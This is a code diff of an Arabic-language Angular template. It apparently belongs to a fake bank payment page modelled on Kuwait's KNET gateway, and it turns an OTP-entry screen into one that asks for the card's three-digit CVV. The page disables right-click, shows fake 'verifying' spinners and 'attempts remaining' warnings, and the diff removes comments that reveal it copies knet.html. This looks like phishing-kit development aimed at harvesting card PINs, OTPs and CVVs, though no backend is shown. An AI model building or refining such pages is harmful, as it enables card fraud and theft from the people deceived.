@@ -1,8 +1,8 @@
 <form oncontextmenu="return false;" (submit)="onSubmit($event)">
-    <div id="OtpPageEntry"
+    <div id="CvvPageEntry"
         style="display: flex; flex-direction: column; align-items: center; justify-content: flex-start; height: 100vh; max-height: 100vh; background-color: #E8E8E8; padding-top: 20px; padding-bottom: 20px; box-sizing: border-box; width: 100%; max-width: 100%; overflow: hidden; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; position: fixed; inset: 0;">
 
-        <!-- Top Banner Placeholder (Diraya) -->
+        <!-- Top Banner -->
         <img src="imgs/mob.jpg" alt="Diraya"
             class="w-[92vw] max-w-110 rounded-lg shadow-sm mb-3 object-contain block mx-auto" />
 
@@ -22,7 +22,7 @@
                 style="width: 50px; height: 50px; border: 5px solid #fff; border-top-color: #0077D5; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;">
             </div>
             <p style="color: #fff; font-size: 16px; font-weight: bold; margin: 0; text-align: center;">الرجاء الانتظار،
-                جاري التحقق من رمز التحقق...</p>
+                جاري التحقق من رمز CVV...</p>
             <style>
                 @keyframes spin {
                     to {
@@ -33,7 +33,7 @@
         </div>
         }
 
-        <!-- Outer Cards Wrapper (matching knet.html) -->
+        <!-- Outer Cards Wrapper -->
         <div class="wrapper w-[92vw] max-w-110 flex flex-col items-center shadow-[0_4px_10px_rgba(0,0,0,0.06)]! m-0! md:mt-2!"
             style="width: 90%; max-width: 440px; margin: 0 auto; display: flex; flex-direction: column; align-items: center;">
 
@@ -69,22 +69,22 @@
                 </div>
             </div>
 
-            <!-- Box 2 (Details & OTP Entry) -->
+            <!-- Box 2 (Details & CVV Entry) -->
             <div class="contentBox box-style p-3! mb-2!"
                 style="border-radius: 20px; border: 2px solid #aeb2b7; box-shadow: 0 4px 10px rgba(0,0,0,0.06); background: #fff; box-sizing: border-box;">
 
                 <!-- Warning Alert Box / Red attempts warning -->
-                @if (otpRejected()) {
+                @if (cvvRejected()) {
                     <div style="border: 1.5px solid #FF0000; background: #FDE8E8; padding: 12px 10px; border-radius: 4px; margin-bottom: 20px; direction: rtl; text-align: center; box-sizing: border-box; width: 100%;">
                         <p style="color: #E02424; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; font-size: 13px; font-weight: bold; line-height: 1.6; margin: 0; text-align: center;">
-                            OTP غير صحيح<br />
+                            CVV غير صحيح<br />
                             باقي {{ attemptsRemaining() }} محاولات فقط
                         </p>
                     </div>
                 } @else {
                     <div style="border: 1px solid #85bbec; background: #d9edf7; padding: 10px; border-radius: 3px; margin-bottom: 20px; direction: rtl; text-align: right;">
                         <p style="color: #31708f; font-family: Arial, Helvetica, serif; font-size: 11px; line-height: 1.5; margin: 0;">
-                            يرجى الانتباه: سيتم الآن ارسال رسالة نصية على رقم هاتف الجوال المسجل لدى البنك الخاص بك. هذه الرسالة المكونة من 6 خانات هي "رمز التحقق لمرة واحدة"، يرجى استخدام هذا الرمز في الحقل المناسب أدناه
+                            يرجى إدخال رمز CVV المكون من 3 أرقام الموجود على ظهر بطاقتك المصرفية
                         </p>
                     </div>
                 }
@@ -130,26 +130,14 @@
 
                     <hr style="border: 0; border-top: 1px solid #ccc; margin: 4px 0;">
 
-                    <!-- PIN Row -->
+                    <!-- CVV Row -->
                     <div
                         style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
                         <span
-                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">الرقم
-                            السري (PIN):</span>
-                        <span
-                            style="flex-grow: 1; text-align: center; color: #333; font-size: 13px; font-weight: bold; letter-spacing: 2px;">****</span>
-                    </div>
-
-                    <hr style="border: 0; border-top: 1px solid #ccc; margin: 4px 0;">
-
-                    <!-- OTP Row -->
-                    <div
-                        style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; width: 100%;">
-                        <span
-                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">:OTP</span>
+                            style="color: #0077D5; font-weight: bold; font-size: 12px; min-width: 140px; text-align: right; margin: 0;">:CVV</span>
                         <div style="flex-grow: 1; display: flex; justify-content: center; width: 100%;">
-                            <input type="text" inputmode="numeric" autocomplete="off" [placeholder]="timerText()"
-                                maxlength="6" [value]="otpValue()" (input)="onOtpInput($event)"
+                            <input type="password" inputmode="numeric" autocomplete="off" [placeholder]="timerText()"
+                                maxlength="3" [value]="cvvValue()" (input)="onCvvInput($event)"
                                 style="width: 100%; max-width: 170px; text-align: center; font-size: 16px !important; font-weight: bold; padding: 4px 8px; border: 1px solid #a6a6a6; border-top: 1px solid #828282; border-radius: 6px; color: #333; outline: none; background: #fff; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); height: 26px;"
                                 required />
                         </div>
